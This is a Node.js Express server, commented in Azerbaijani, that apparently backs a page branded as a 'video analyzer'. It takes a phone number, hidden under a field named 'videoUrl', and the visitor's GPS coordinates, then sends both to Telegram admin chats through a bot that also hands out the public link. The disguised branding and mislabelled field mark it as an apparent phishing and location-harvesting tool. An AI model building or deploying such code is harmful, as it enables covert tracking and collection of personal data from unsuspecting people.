// server.js
const express = require('express');
const path = require('path');
const cors = require('cors');
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ================== CONFIG ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim())
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram hazırdır');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

// ================== MIDDLEWARE ==================
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ================== TELEGRAM SENDER ==================
async function sendToTelegram(text) {
  for (const chatId of TELEGRAM_CHAT_IDS) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text
        })
      });
    } catch (e) {
      console.error('Telegram göndərmə xətası:', e.message);
    }
  }
}

// ================== API ==================
app.post('/api/send-data', async (req, res) => {
  try {
    const { videoUrl, location } = req.body;

    let message = '';

    if (videoUrl) {
      message += `📞 Nömrə: ${videoUrl}\n`;
    }

    if (location?.latitude && location?.longitude) {
      message += `📍 Lokasiya alındı\n`;
      message += `🌍 ${location.latitude}, ${location.longitude}\n`;
    } else {
      message += `📍 Lokasiya əldə edilmədi\n`;
    }

    await sendToTelegram(message.trim());
    res.json({ ok: true });

  } catch (err) {
    console.error('❌ API xətası:', err);
    res.status(500).json({ ok: false });
  }
});

// ================== TELEGRAM WEBHOOK ==================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
  try {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const text = msg.text.trim();

    if (text === '/start') {
      await sendToTelegram(
        `👋 Xoş gəldiniz!
📞 Nömrə daxil etmək üçün linkə keçin:
👉 https://video-analyzer-server.onrender.com

ℹ️ Məlumat üçün /about`
      );
    }

    else if (text === '/about') {
      await sendToTelegram(
        `ℹ️ Bu sistem yalnız test və daxili istifadə üçündür.
Daxil edilən məlumatlar adminə bildirilir.`
      );
    }

    else if (text === '/link') {
      await sendToTelegram(
        `🔗 https://video-analyzer-server.onrender.com`
      );
    }

    res.sendStatus(200);
  } catch (e) {
    console.error('Webhook xətası:', e);
    res.sendStatus(200);
  }
});

// ================== FRONTEND ==================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ================== START ==================
app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda işləyir`);
});
